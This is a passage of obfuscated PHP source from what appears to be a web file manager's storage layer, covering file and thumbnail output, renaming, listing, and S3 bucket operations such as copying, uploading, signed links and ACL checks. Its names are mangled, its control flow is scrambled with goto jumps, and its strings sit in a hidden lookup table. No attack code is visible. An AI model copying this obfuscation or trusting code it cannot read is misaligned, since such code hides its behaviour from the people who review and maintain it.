? IO::fileOut($eª‚˜‹Åù·) : $this->fileOut($f¼¥Ï±Ïòù); } goto AòåëÊÎæ±; AòåëÊÎæ±: if (!($CŞáß“Úï‚ = IO::move($aòÉğÕ¿©, $e¿ĞÊğğ))) { return IO::fileOut($aòÉğÕ¿©); } del_file($aòÉğÕ¿©); IO::fileOut($CŞáß“Úï‚); goto dêË’Œ‰¶•; AêêˆùÁ›Ü: $B»’™ñÂŒÒ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (substr($f¼¥Ï±Ïòù, 0, 4) == $B»’™ñÂŒÒ[154]) { $this->fileOutLink($f¼¥Ï±Ïòù); } $bã£Ÿ‚Ï² = $this->info($f¼¥Ï±Ïòù); goto a‘‡ÃİèÍ; a‘‡ÃİèÍ: if ($bã£Ÿ‚Ï²[$B»’™ñÂŒÒ[87]] <= 1024 * 50 || !function_exists($B»’™ñÂŒÒ[169]) || $bã£Ÿ‚Ï²[$B»’™ñÂŒÒ[170]] == $B»’™ñÂŒÒ[171]) { return $this->fileOut($f¼¥Ï±Ïòù); } if (isset($bã£Ÿ‚Ï²[$B»’™ñÂŒÒ[172]][$B»’™ñÂŒÒ[173]])) { $fÍÕö‚Ş…é = $bã£Ÿ‚Ï²[$B»’™ñÂŒÒ[172]][$B»’™ñÂŒÒ[173]]; } else { if (isset($bã£Ÿ‚Ï²[$B»’™ñÂŒÒ[172]][$B»’™ñÂŒÒ[174]])) { $fÍÕö‚Ş…é = $bã£Ÿ‚Ï²[$B»’™ñÂŒÒ[172]][$B»’™ñÂŒÒ[174]]; } else { $fÍÕö‚Ş…é = md5("{$bã£Ÿ‚Ï²[$B»’™ñÂŒÒ[28]]}\x5f{$bã£Ÿ‚Ï²[$B»’™ñÂŒÒ[85]]}\x5f{$bã£Ÿ‚Ï²[$B»’™ñÂŒÒ[87]]}"); } } $F‰²¥Ã¯ = "{$fÍÕö‚Ş…é}\137{$B¬Ä­ÀÖ¬}\56\160\156\147"; goto fãîÚÒÄ¡; fãîÚÒÄ¡: if (!($FŸˆ†å³ò = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $B»’™ñÂŒÒ[175]))) { $e¿ĞÊğğ = IO::mkdir(IO_PATH_SYSTEM_TEMP . $B»’™ñÂŒÒ[176]); } else { $e¿ĞÊğğ = KodIO::make($FŸˆ†å³ò); } if ($FŸˆ†å³ò = IO::fileNameExist($e¿ĞÊğğ, $F‰²¥Ã¯)) { $aòÉğÕ¿© = KodIO::make($FŸˆ†å³ò); return IO::fileOut($aòÉğÕ¿©); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } goto B½ÀŸŠ‡ƒ‘; dêË’Œ‰¶•: } public function fileOutImageServer($BÕ¿×Ëñ¥, $e¿‰¸®Ù‘¼ = 250) { $this->fileOutImage($BÕ¿×Ëñ¥, $e¿‰¸®Ù‘¼); } public function fileNameAuto($F‰÷¯ºŞêË, $dù™¦Ù¢ÂÅ, $EÔÅí«ƒêÒ = REPEAT_RENAME, $FáÖ¢ê›”­ = false) { goto d‹†«…Û›; eÔĞôé“ê: $FÁíİæ•¦ = 1; $D¥¨õ”İÆ‘ = substr($dù™¦Ù¢ÂÅ, 0, strlen($dù™¦Ù¢ÂÅ) - strlen($b¼‚Á‰×»)); $Eñœóªˆ¼¬ = $D¥¨õ”İÆ‘ . "\x28{$FÁíİæ•¦}\x29{$b¼‚Á‰×»}"; goto aãìñ½î÷; d‹†«…Û›: $F³ÜÍÚ±ÌŒ =& $_SERVER[¶ªÕß‚ØÁŸ]; $DÀ‚ìßÂÊ = $F‰÷¯ºŞêË === $F³ÜÍÚ±ÌŒ[33] ? $dù™¦Ù¢ÂÅ : rtrim($F‰÷¯ºŞêË, $F³ÜÍÚ±ÌŒ[8]) . $F³ÜÍÚ±ÌŒ[8] . $dù™¦Ù¢ÂÅ; if ($EÔÅí«ƒêÒ == REPEAT_REPLACE || !$this->exist($DÀ‚ìßÂÊ) || $FáÖ¢ê›”­ && $EÔÅí«ƒêÒ != REPEAT_RENAME_FOLDER) { return $dù™¦Ù¢ÂÅ; } goto eïÔ‡Ä ˆ; eïÔ‡Ä ˆ: if ($EÔÅí«ƒêÒ == REPEAT_SKIP) { return !1; } $b¼‚Á‰×» = $F³ÜÍÚ±ÌŒ[101] . get_path_ext($dù™¦Ù¢ÂÅ); $b¼‚Á‰×» = $b¼‚Á‰×» == $F³ÜÍÚ±ÌŒ[101] || $FáÖ¢ê›”­ ? $F³ÜÍÚ±ÌŒ[33] : $b¼‚Á‰×»; goto eÔĞôé“ê; aãìñ½î÷: while ($this->exist(rtrim($F‰÷¯ºŞêË, $F³ÜÍÚ±ÌŒ[8]) . $F³ÜÍÚ±ÌŒ[8] . $Eñœóªˆ¼¬)) { $Eñœóªˆ¼¬ = $D¥¨õ”İÆ‘ . "\50{$FÁíİæ•¦}\x29{$b¼‚Á‰×»}"; $FÁíİæ•¦++; } return $Eñœóªˆ¼¬; goto eÉ„Îîª¶ë; eÉ„Îîª¶ë: } public function listAllFiles($aòÊ˜ó¡, $bØ÷®Š¶Ë÷, $b¤ÃŸö™§ = array()) { goto B¨œ Ÿªê; B¨œ Ÿªê: $f£ô˜¤ÅŞ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (empty($bØ÷®Š¶Ë÷)) { return array(); } $Fø¬»‰ª = array(); goto cÎª¬÷è„…; b¨²”ºĞ¹ğ: foreach (array_unique($Fø¬»‰ª) as $fñ¤‘Ü) { $dÃ°Â¦È˜‘ = array($f£ô˜¤ÅŞ[85] => $this->getPathOuter($f£ô˜¤ÅŞ[8] . $aòÊ˜ó¡ . $f£ô˜¤ÅŞ[8] . $fñ¤‘Ü), $f£ô˜¤ÅŞ[86] => 1, $f£ô˜¤ÅŞ[87] => 0); if (substr($fñ¤‘Ü, -1) != $f£ô˜¤ÅŞ[8]) { $dÃ°Â¦È˜‘[$f£ô˜¤ÅŞ[86]] = 0; $C²‚‰ŞšÌÀ = $this->getPath($aòÊ˜ó¡ . $f£ô˜¤ÅŞ[8] . $fñ¤‘Ü); $dÃ°Â¦È˜‘[$f£ô˜¤ÅŞ[87]] = isset($b¤ÃŸö™§[$C²‚‰ŞšÌÀ]) ? $b¤ÃŸö™§[$C²‚‰ŞšÌÀ] : $this->size($C²‚‰ŞšÌÀ); } $E¸ßß—©¹Ò[] = $dÃ°Â¦È˜‘; } return $E¸ßß—©¹Ò; goto f‰ÓÓ›ö¯Ş; cÎª¬÷è„…: $aòÊ˜ó¡ = trim($aòÊ˜ó¡, $f£ô˜¤ÅŞ[8]); foreach ($bØ÷®Š¶Ë÷ as $fñ¤‘Ü) { $cìãÂÛÙâš = ltrim(substr($fñ¤‘Ü, strlen($aòÊ˜ó¡)), $f£ô˜¤ÅŞ[8]); $Fø¬»‰ª = array_merge($Fø¬»‰ª, $this->slicePath($cìãÂÛÙâš)); } $E¸ßß—©¹Ò = array(); goto b¨²”ºĞ¹ğ; f‰ÓÓ›ö¯Ş: } public function slicePath($F™¦àŠšÂø) { $Dç÷ˆâ®† =& $_SERVER[¶ªÕß‚ØÁŸ]; $AáŒçƒ« = explode($Dç÷ˆâ®†[8], trim($F™¦àŠšÂø, $Dç÷ˆâ®†[8])); $A›‚ÒÄŠÃ = 0; do { ++$A›‚ÒÄŠÃ; $Eà÷´İĞŞ[] = implode($Dç÷ˆâ®†[8], array_slice($AáŒçƒ«, 0, $A›‚ÒÄŠÃ)) . $Dç÷ˆâ®†[8]; } while ($A›‚ÒÄŠÃ < count($AáŒçƒ«)); $Eà÷´İĞŞ[count($AáŒçƒ«) - 1] = $F™¦àŠšÂø; return $Eà÷´İĞŞ; } public function getHost() { $e¥öÑÃ÷’æ =& $_SERVER[¶ªÕß‚ØÁŸ]; $fÁ¥ÅƒÁÜŸ = parse_url(trim($this->domain, $e¥öÑÃ÷’æ[8])); $E‚‰å”¸Ì = isset($fÁ¥ÅƒÁÜŸ[$e¥öÑÃ÷’æ[178]]) ? $fÁ¥ÅƒÁÜŸ[$e¥öÑÃ÷’æ[178]] : http_type(); $a‰ì±¸…‡ = isset($fÁ¥ÅƒÁÜŸ[$e¥öÑÃ÷’æ[179]]) ? $fÁ¥ÅƒÁÜŸ[$e¥öÑÃ÷’æ[179]] : $fÁ¥ÅƒÁÜŸ[$e¥öÑÃ÷’æ[85]]; if (isset($fÁ¥ÅƒÁÜŸ[$e¥öÑÃ÷’æ[180]])) { $a‰ì±¸…‡ .= $e¥öÑÃ÷’æ[4] . $fÁ¥ÅƒÁÜŸ[$e¥öÑÃ÷’æ[180]]; } return $E‚‰å”¸Ì . $e¥öÑÃ÷’æ[181] . $a‰ì±¸…‡; } public function pathEncode($a¤†Ò…äáØ) { $DµçéÚÌ¬ =& $_SERVER[¶ªÕß‚ØÁŸ]; return str_replace($DµçéÚÌ¬[182], $DµçéÚÌ¬[8], rawurlencode($a¤†Ò…äáØ)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\x34"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public function __construct($fÚÒóº³–‹) { set_timeout(); require_once SDK_DIR . $_SERVER[¶ªÕß‚ØÁŸ][183]; parent::__construct(); $this->_init($fÚÒóº³–‹); } public function _init($FŠ„Íç“â) { foreach ($FŠ„Íç“â as $cÊŸ±øÇê => $Bğ½İôö×®) { if (isset($this->{$cÊŸ±øÇê})) { $this->{$cÊŸ±øÇê} = $Bğ½İôö×®; } } $this->endpoint = $FŠ„Íç“â[$_SERVER[¶ªÕß‚ØÁŸ][184]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($b«¢Ğ Õ™Á = "\x76\64") { $this->signVer = $b«¢Ğ Õ™Á; $this->client->setSignatureVersion($b«¢Ğ Õ™Á); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto a½“Í•çÍ§; Dªƒ¿«áç¦: $dæ‹ò°¢í÷ = array($B¼ŠñãŒ²Ó[190], $B¼ŠñãŒ²Ó[191], $B¼ŠñãŒ²Ó[192], $B¼ŠñãŒ²Ó[193], $B¼ŠñãŒ²Ó[194]); $CÅ¶¢°ƒ˜‰ = array_diff($dæ‹ò°¢í÷, $aŠŸŒÎ·“Ï); return empty($CÅ¶¢°ƒ˜‰); goto dÍ³Ø“Æè; eİÍÃ¤Ğ¢®: if ($c­³ºªğ”¸[$B¼ŠñãŒ²Ó[185]] != $B¼ŠñãŒ²Ó[186] || $c­³ºªğ”¸[$B¼ŠñãŒ²Ó[187]] != $B¼ŠñãŒ²Ó[186]) { return !1; } $aŠŸŒÎ·“Ï = array_map($B¼ŠñãŒ²Ó[188], $c­³ºªğ”¸[$B¼ŠñãŒ²Ó[189]]); if (!is_array($aŠŸŒÎ·“Ï)) { $aŠŸŒÎ·“Ï = array(); } goto Dªƒ¿«áç¦; a½“Í•çÍ§: $B¼ŠñãŒ²Ó =& $_SERVER[¶ªÕß‚ØÁŸ]; $c­³ºªğ”¸ = $this->getBucketCors(); if (!$c­³ºªğ”¸ || !is_array($c­³ºªğ”¸)) { return !1; } goto eİÍÃ¤Ğ¢®; dÍ³Ø“Æè: } public function mkfile($aë§æ×ÅÌ‚, $F¯¼½ëäÆ = '', $B°Š‚Áà¦á = REPEAT_RENAME) { $DÍÍÔ¯®òÃ = $this->setContent($aë§æ×ÅÌ‚, $F¯¼½ëäÆ); if ($DÍÍÔ¯®òÃ !== !1) { return $this->getPathOuter($aë§æ×ÅÌ‚); } return !1; } public function mkdir($aƒïÂôß¬¥, $Eˆ³ä¥ó¯ = REPEAT_SKIP) { if (empty($aƒïÂôß¬¥)) { return !1; } if ($this->_isFolder($aƒïÂôß¬¥)) { return $this->getPathOuter($aƒïÂôß¬¥); } $E×Áçö ô„ = $this->setContent($aƒïÂôß¬¥, $_SERVER[¶ªÕß‚ØÁŸ][33], !0); if ($E×Áçö ô„ !== !1) { return $this->getPathOuter($aƒïÂôß¬¥); } return !1; } public function copyFile($Bìæ­àÙÑ¯, $FßÄÇ”°…˜, $bÆÉå£ëÅ¥ = array()) { $a‘ŠÉˆšõé =& $_SERVER[¶ªÕß‚ØÁŸ]; $fÖª°¶ƒïÌ = $this->objectMeta($Bìæ­àÙÑ¯); if (!$fÖª°¶ƒïÌ) { return !1; } if ($fÖª°¶ƒïÌ[$a‘ŠÉˆšõé[87]] <= 1024 * 1024 * 200) { $cÚèö‡¡ß = $this->client->copyObject($this->bucket, $Bìæ­àÙÑ¯, $this->bucket, $FßÄÇ”°…˜, $a‘ŠÉˆšõé[195], $bÆÉå£ëÅ¥); } else { $cÚèö‡¡ß = $this->client->multiCopyObject($this->bucket, $Bìæ­àÙÑ¯, $this->bucket, $FßÄÇ”°…˜, $bÆÉå£ëÅ¥); } $cÚèö‡¡ß = $cÚèö‡¡ß ? $this->getPathOuter($FßÄÇ”°…˜) : !1; return $cÚèö‡¡ß; } public function moveFile($cŸİ‡Ç’á¼, $C¡éñù«²“) { if ($this->copyFile($cŸİ‡Ç’á¼, $C¡éñù«²“)) { $this->delFile($cŸİ‡Ç’á¼); return $this->getPathOuter($C¡éñù«²“); } return !1; } public function delFile($EÉÀØ¾ŸÑØ) { return $this->client->deleteObject($this->bucket, $EÉÀØ¾ŸÑØ); } public function delFolder($fÍ‰ÁèÛ›©) { goto a¥ÀÑĞÌŒ; a¥ÀÑĞÌŒ: $f®”¢Ü¾Ø =& $_SERVER[¶ªÕß‚ØÁŸ]; $FÍêğ²À„ = $this->listObjs($fÍ‰ÁèÛ›©); if (!$FÍêğ²À„) { $fÍ‰ÁèÛ›© = trim($fÍ‰ÁèÛ›©, $f®”¢Ü¾Ø[8]); if (!empty($fÍ‰ÁèÛ›©)) { $fÍ‰ÁèÛ›© .= $f®”¢Ü¾Ø[8]; } return $this->delFile($fÍ‰ÁèÛ›©); } goto dœù÷©§ãÉ; dœù÷©§ãÉ: $B³ŞåƒØ× = $eŞ¦»ˆ£ëö = 0; $A…øñÎ… = array_chunk(array_keys($FÍêğ²À„), 1000); foreach ($A…øñÎ… as $Fì¶ò¥“«œ) { $B³ŞåƒØ×++; $eŞ¦»ˆ£ëö += (int) $this->client->deleteObjects($this->bucket, $Fì¶ò¥“«œ); } goto AÁ›ëëƒ°¬; AÁ›ëëƒ°¬: return $B³ŞåƒØ× === $eŞ¦»ˆ£ëö ? !0 : !1; goto c”×œ´µ–; c”×œ´µ–: } public function rename($C­²ÊÌ°ã, $EÎ¥Øß¥èÆ) { return $this->renameObject($C­²ÊÌ°ã, $EÎ¥Øß¥èÆ); } public function listPath($DÈª«ˆÛ»Ò, $BÌˆ†‡ğã = false) { $b‡ù©ÂÎØŸ =& $_SERVER[¶ªÕß‚ØÁŸ]; $fÀœ¶ôÓ¸‚ = $this->listObjs($DÈª«ˆÛ»Ò, null, null, $b‡ù©ÂÎØŸ[8]); $Cˆ´¸áÂà = array($b‡ù©ÂÎØŸ[84] => array(), $b‡ù©ÂÎØŸ[83] => array()); foreach ($fÀœ¶ôÓ¸‚ as $Aã±£…¯» => $fğ²¾¦Çİ) { if ($Aã±£…¯» == $b‡ù©ÂÎØŸ[8]) { continue; } if (isset($fğ²¾¦Çİ[$b‡ù©ÂÎØŸ[196]])) { $Cˆ´¸áÂà[$b‡ù©ÂÎØŸ[84]][] = $this->folderInfo($fğ²¾¦Çİ[$b‡ù©ÂÎØŸ[196]], $BÌˆ†‡ğã); } else { if (substr($fğ²¾¦Çİ[$b‡ù©ÂÎØŸ[28]], -1) == $b‡ù©ÂÎØŸ[8]) { continue; } $Cˆ´¸áÂà[$b‡ù©ÂÎØŸ[83]][] = $this->fileInfo($fğ²¾¦Çİ[$b‡ù©ÂÎØŸ[28]], $BÌˆ†‡ğã, $fğ²¾¦Çİ); } } return $Cˆ´¸áÂà; } private function fileInfo($b½±ÒÀÈš, $BÒƒæ·õ‘ = false, $c‚’î˜ßåÓ = array()) { goto e¹ÂñîâÜ; B‹ëîİÎ‹Ö: return $dŸ¸Ç†ô; goto dåÚÕÉ¦°¯; e¹ÂñîâÜ: $E¬²Ÿ˜ÚÓÒ =& $_SERVER[¶ªÕß‚ØÁŸ]; if ($BÒƒæ·õ‘) { return array($E¬²Ÿ˜ÚÓÒ[28] => $this->pathThis($b½±ÒÀÈš), $E¬²Ÿ˜ÚÓÒ[85] => $this->getPathOuter($b½±ÒÀÈš), $E¬²Ÿ˜ÚÓÒ[29] => $E¬²Ÿ˜ÚÓÒ[177], $E¬²Ÿ˜ÚÓÒ[170] => $this->ext($b½±ÒÀÈš), $E¬²Ÿ˜ÚÓÒ[87] => isset($c‚’î˜ßåÓ[$E¬²Ÿ˜ÚÓÒ[87]]) ? $c‚’î˜ßåÓ[$E¬²Ÿ˜ÚÓÒ[87]] : 0, $E¬²Ÿ˜ÚÓÒ[197] => 0, $E¬²Ÿ˜ÚÓÒ[117] => 0, $E¬²Ÿ˜ÚÓÒ[198] => !0, $E¬²Ÿ˜ÚÓÒ[199] => !0); } $dŸ¸Ç†ô = array($E¬²Ÿ˜ÚÓÒ[28] => $this->pathThis($b½±ÒÀÈš), $E¬²Ÿ˜ÚÓÒ[85] => $this->getPathOuter($b½±ÒÀÈš), $E¬²Ÿ˜ÚÓÒ[29] => $E¬²Ÿ˜ÚÓÒ[177], $E¬²Ÿ˜ÚÓÒ[197] => 0, $E¬²Ÿ˜ÚÓÒ[117] => 0, $E¬²Ÿ˜ÚÓÒ[87] => 0, $E¬²Ÿ˜ÚÓÒ[170] => $this->ext($b½±ÒÀÈš), $E¬²Ÿ˜ÚÓÒ[198] => !0, $E¬²Ÿ˜ÚÓÒ[199] => !0); goto d‰É×ƒôÖ; d‰É×ƒôÖ: if (empty($c‚’î˜ßåÓ)) { $c‚’î˜ßåÓ = $this->objectMeta($b½±ÒÀÈš); if (!$c‚’î˜ßåÓ) { return $dŸ¸Ç†ô; } } if (isset($c‚’î˜ßåÓ[$E¬²Ÿ˜ÚÓÒ[200]])) { $dŸ¸Ç†ô[$E¬²Ÿ˜ÚÓÒ[117]] = $c‚’î˜ßåÓ[$E¬²Ÿ˜ÚÓÒ[200]]; } if (isset($c‚’î˜ßåÓ[$E¬²Ÿ˜ÚÓÒ[87]])) { $dŸ¸Ç†ô[$E¬²Ÿ˜ÚÓÒ[87]] = $c‚’î˜ßåÓ[$E¬²Ÿ˜ÚÓÒ[87]]; } goto B‹ëîİÎ‹Ö; dåÚÕÉ¦°¯: } private function folderInfo($Ešê™­¼ê×, $cæÍ¢·‘Ê = false) { goto eóÙ³Ç‡ÅÊ; BÁŒòã»–ƒ: if ($Ešê™­¼ê× == $f¼ã™Ç“ê·[33]) { return $AÓœËİ¸Ù‡; } $Ešê™­¼ê× = trim($Ešê™­¼ê×, $f¼ã™Ç“ê·[8]) . $f¼ã™Ç“ê·[8]; $c•À“¨¿ƒ = $this->objectMeta($Ešê™­¼ê×); goto Cò¸š¼½—ƒ; Cò¸š¼½—ƒ: if (isset($c•À“¨¿ƒ[$f¼ã™Ç“ê·[200]])) { $AÓœËİ¸Ù‡[$f¼ã™Ç“ê·[197]] = $c•À“¨¿ƒ[$f¼ã™Ç“ê·[200]]; } return $AÓœËİ¸Ù‡; goto aÒ–†â¬Œ‹; eóÙ³Ç‡ÅÊ: $f¼ã™Ç“ê· =& $_SERVER[¶ªÕß‚ØÁŸ]; if ($cæÍ¢·‘Ê) { return array($f¼ã™Ç“ê·[28] => $this->pathThis($Ešê™­¼ê×), $f¼ã™Ç“ê·[85] => $this->getPathOuter($f¼ã™Ç“ê·[8] . $Ešê™­¼ê×), $f¼ã™Ç“ê·[29] => $f¼ã™Ç“ê·[86], $f¼ã™Ç“ê·[198] => !0, $f¼ã™Ç“ê·[199] => !0); } $AÓœËİ¸Ù‡ = array($f¼ã™Ç“ê·[28] => $this->pathThis($Ešê™­¼ê×), $f¼ã™Ç“ê·[85] => $this->getPathOuter($f¼ã™Ç“ê·[8] . $Ešê™­¼ê×), $f¼ã™Ç“ê·[29] => $f¼ã™Ç“ê·[86], $f¼ã™Ç“ê·[197] => 0, $f¼ã™Ç“ê·[117] => 0, $f¼ã™Ç“ê·[198] => !0, $f¼ã™Ç“ê·[199] => !0); goto BÁŒòã»–ƒ; aÒ–†â¬Œ‹: } public function listObjs($Dš¹è«•ŞØ, $A—Şï…œ„Ú = null, $dè·ÆğÍ’› = null, $A½ƒ¨Ê†ªæ = null) { $FŒß©ÌêÌØ =& $_SERVER[¶ªÕß‚ØÁŸ]; $Dš¹è«•ŞØ = trim($Dš¹è«•ŞØ, $FŒß©ÌêÌØ[8]); $dï²ˆïŠÄ¡ = empty($Dš¹è«•ŞØ) ? $FŒß©ÌêÌØ[33] : $Dš¹è«•ŞØ . $FŒß©ÌêÌØ[8]; return $this->client->getBucket($this->bucket, $dï²ˆïŠÄ¡, $A—Şï…œ„Ú, $dè·ÆğÍ’›, $A½ƒ¨Ê†ªæ, !0); } public function has($Aø»Œ¹òŒù, $d³èÔ‘¹æ = false, $aéô—î­Ì = true) { goto A¨¯‹ğ½½; A¨¯‹ğ½½: $b’›×ù¹ß° =& $_SERVER[¶ªÕß‚ØÁŸ]; $AÎ»Íà•òù = 0; $c¶´®åó¦ä = 0; goto cå¯‰«”æÂ; c‡êñÜ³ê»: if ($d³èÔ‘¹æ) { return array($b’›×ù¹ß°[201] => $AÎ»Íà•òù, $b’›×ù¹ß°[202] => $c¶´®åó¦ä); } return !1; goto c²ĞÆÖ×¤ö; cå¯‰«”æÂ: $f•º…šÜÀ = $this->listObjs($Aø»Œ¹òŒù, null, null, $b’›×ù¹ß°[8]); $f•º…šÜÀ = is_array($f•º…šÜÀ) ? $f•º…šÜÀ : array(); foreach ($f•º…šÜÀ as $CçâÃ’ƒ×œ) { if (isset($CçâÃ’ƒ×œ[$b’›×ù¹ß°[28]]) && substr($CçâÃ’ƒ×œ[$b’›×ù¹ß°[28]], -1) != $b’›×ù¹ß°[8]) { if (!$d³èÔ‘¹æ && $aéô—î­Ì) { return !0; } $AÎ»Íà•òù++; } else { if (isset($CçâÃ’ƒ×œ[$b’›×ù¹ß°[196]])) { if (!$d³èÔ‘¹æ && !$aéô—î­Ì) { return !1; } $c¶´®åó¦ä++; } } } goto c‡êñÜ³ê»; c²ĞÆÖ×¤ö: } public function listAll($F­Ò·ƒà) { $A„êÇ£Š¢¬ =& $_SERVER[¶ªÕß‚ØÁŸ]; $BêóËĞÀÎò = $this->listObjs($F­Ò·ƒà); $f¾§Œë–´„ = $aÍ¸ŠÆ¨‘ = array(); foreach ($BêóËĞÀÎò as $e¬‡É‹‘ŠÃ => $f¸ÙÚ¤´ï) { $f¾§Œë–´„[] = $f¸ÙÚ¤´ï[$A„êÇ£Š¢¬[28]]; $aÍ¸ŠÆ¨‘[$e¬‡É‹‘ŠÃ] = $f¸ÙÚ¤´ï[$A„êÇ£Š¢¬[87]]; } return $this->listAllFiles($F­Ò·ƒà, $f¾§Œë–´„, $aÍ¸ŠÆ¨‘); } public function canRead($fö¦ì‹È¡º) { $e¦ß§èŠø =& $_SERVER[¶ªÕß‚ØÁŸ]; $Fµ½µ©×‡ = $this->client->getAccessControlPolicy($this->bucket, $fö¦ì‹È¡º); if (!$Fµ½µ©×‡) { return !1; } return in_array($Fµ½µ©×‡, array($e¦ß§èŠø[203], $e¦ß§èŠø[204], $e¦ß§èŠø[205])) ? !0 : !1; } public function canWrite($aİÙ´ïõ¢) { $C®éÕëøáª =& $_SERVER[¶ªÕß‚ØÁŸ]; $eÆ‰´•õë = $this->client->getAccessControlPolicy($this->bucket, $aİÙ´ïõ¢); if (!$eÆ‰´•õë) { return !1; } return in_array($eÆ‰´•õë, array($C®éÕëøáª[203], $C®éÕëøáª[204])) ? !0 : !1; } public function getContent($D‰İÀëæ½) { return $this->client->getObject($this->bucket, $D‰İÀëæ½); } public function setContent($eÂ”èƒøªÀ, $eÜœß¦Ô•½ = '', $eùâòíåò¤ = false) { goto Bè­‡·î‰±; F¯òìçÁ: $E·ø‡Şƒ‚ = $this->client->putObject($eÜœß¦Ô•½, $this->bucket, $eÂ”èƒøªÀ, $E­å½·¥Šù[195], array(), $eÇÑ®†°ì®); if (!$E·ø‡Şƒ‚) { return !1; } if ($eùâòíåò¤) { return !0; } goto FÄ¢ˆ§æ; Bè­‡·î‰±: $E­å½·¥Šù =& $_SERVER[¶ªÕß‚ØÁŸ]; $eÂ”èƒøªÀ = $eùâòíåò¤ ? trim($eÂ”èƒøªÀ, $E­å½·¥Šù[8]) . $E­å½·¥Šù[8] : $eÂ”èƒøªÀ; $eÇÑ®†°ì® = get_file_mime(get_path_ext($eÂ”èƒøªÀ)); goto F¯òìçÁ; FÄ¢ˆ§æ: $E·ø‡Şƒ‚ = $this->copyFile($eÂ”èƒøªÀ, $eÂ”èƒøªÀ, array($E­å½·¥Šù[206] => $E·ø‡Şƒ‚[$E­å½·¥Šù[207]])); return $E·ø‡Şƒ‚ ? !0 : !1; goto bæöï×Ï’‚; bæöï×Ï’‚: } public function fileSubstr($fÎ°óæ°Œ›, $B†×ˆË‰´î, $EöÉ§ÒøÄ) { $cø¥ƒ£–² = $B†×ˆË‰´î + $EöÉ§ÒøÄ - 1; return $this->client->getObject($this->bucket, $fÎ°óæ°Œ›, array($_SERVER[¶ªÕß‚ØÁŸ][208] => "\142\x79\164\145\x73\x3d{$B†×ˆË‰´î}\x2d{$cø¥ƒ£–²}")); } public function upload($eœÑß »¯ğ, $A„íääõµ², $a¥ËÚŞ¼› = false, $FĞ¶åí£ê˜ = REPEAT_REPLACE) { $eá‡„ù™ŒÕ =& $_SERVER[¶ªÕß‚ØÁŸ]; $aİ¶¢íÓìƒ = array($eá‡„ù™ŒÕ[206] => @md5_file($A„íääõµ²)); $C‘“ºÕ”Ñ‹ = array($eá‡„ù™ŒÕ[209] => get_file_mime(get_path_ext($eœÑß »¯ğ))); if (IO::size($A„íääõµ²) <= 1024 * 1024 * 200) { $C³ğŠ¹ÄÁ = $this->client->putObjectFile($A„íääõµ², $this->bucket, $eœÑß »¯ğ, $eá‡„ù™ŒÕ[195], $aİ¶¢íÓìƒ, $C‘“ºÕ”Ñ‹); return !empty($C³ğŠ¹ÄÁ) ? $this->getPathOuter($eœÑß »¯ğ) : !1; } $Dù ¸ÃÅ· = $this->client->multiUploadObject($A„íääõµ², $this->bucket, trim($eœÑß »¯ğ, $eá‡„ù™ŒÕ[8]), $aİ¶¢íÓìƒ, $C‘“ºÕ”Ñ‹); return $Dù ¸ÃÅ· ? $this->getPathOuter($eœÑß »¯ğ) : !1; } public function download($c·ø¯íªÎ, $f«‹êˆÉĞ) { if (!@is_dir($this->pathFather($f«‹êˆÉĞ)) && !IO::mkdir($this->pathFather($f«‹êˆÉĞ))) { return !1; } $FŠ™°ì†÷â = $this->client->getObject($this->bucket, $c·ø¯íªÎ, array(), $f«‹êˆÉĞ); return $FŠ™°ì†÷â !== !1 ? $f«‹êˆÉĞ : !1; } public function link($e‰¢¾‰õô, $aÈ³ŒÇ¶í = array()) { $eØ“¢£ =& $_SERVER[¶ªÕß‚ØÁŸ]; if ($this->signVer == $eØ“¢£[210]) { return $this->client->getAuthenticatedURL($this->bucket, $e‰¢¾‰õô, 3600 * 12, $aÈ³ŒÇ¶í); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($e‰¢¾‰õô, $eØ“¢£[8]), 3600 * 12, $this->region, array(), !0, $aÈ³ŒÇ¶í); } public function fileOut($dŠ±Ğ½îŠ¤, $cïó™¿óÒº = false, $B¾¨ã·Ã‘ = false, $B•óí‹àà¦ = '') { goto eÜŒ‚£ï°‚; eÜŒ‚£ï°‚: $C¤”ÑÑÃÈ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!$B¾¨ã·Ã‘) { $B¾¨ã·Ã‘ = $this->pathThis($dŠ±Ğ½îŠ¤); } $Bôéç¸ê¤„ = get_file_mime(get_path_ext($B¾¨ã·Ã‘)); goto BÀçŸ®İºâ; Cò¢ğËÑ½Ú: $A·©Òê‡…† = $this->link($dŠ±Ğ½îŠ¤, $BÛí°³áŒ×); $this->fileOutLink($A·©Òê‡…†); goto C¤Æ–öëØ±; BÀçŸ®İºâ: if ($Bôéç¸ê¤„ == $C¤”ÑÑÃÈ[211]) { return parent::fileOut($dŠ±Ğ½îŠ¤, $cïó™¿óÒº, $B¾¨ã·Ã‘, $B•óí‹àà¦); } $cïó™¿óÒº = $cïó™¿óÒº ? $C¤”ÑÑÃÈ[212] : $C¤”ÑÑÃÈ[213]; $BÛí°³áŒ× = array($C¤”ÑÑÃÈ[214] => $cïó™¿óÒº . $C¤”ÑÑÃÈ[215] . rawurlencode($B¾¨ã·Ã‘), $C¤”ÑÑÃÈ[216] => $Bôéç¸ê¤„); goto Cò¢ğËÑ½Ú; C¤Æ–öëØ±: } public function fileOutServer($DÙÌÂéÜ‰, $d­éß»ÊÛ = false, $D›åßİƒßæ = false, $fí‚††äÍ¤ = '') { parent::fileOut($DÙÌÂéÜ‰, $d­éß»ÊÛ, $D›åßİƒßæ, $fí‚††äÍ¤); } public function fileOutImage($C˜óŠ˜îğ‹, $F“¡¦Â¶ä = 250) { $Eó¾¦àï = $this->link($C˜óŠ˜îğ‹); $this->fileOutLink($Eó¾¦àï); } public function fileOutImageServer($A¿ôñÕ‡á, $C‘İÈ‘„ø… = 250) { parent::fileOutImage($A¿ôñÕ‡á, $C‘İÈ‘„ø…); } public function hashMd5($aÃ“Ï‡•è—, 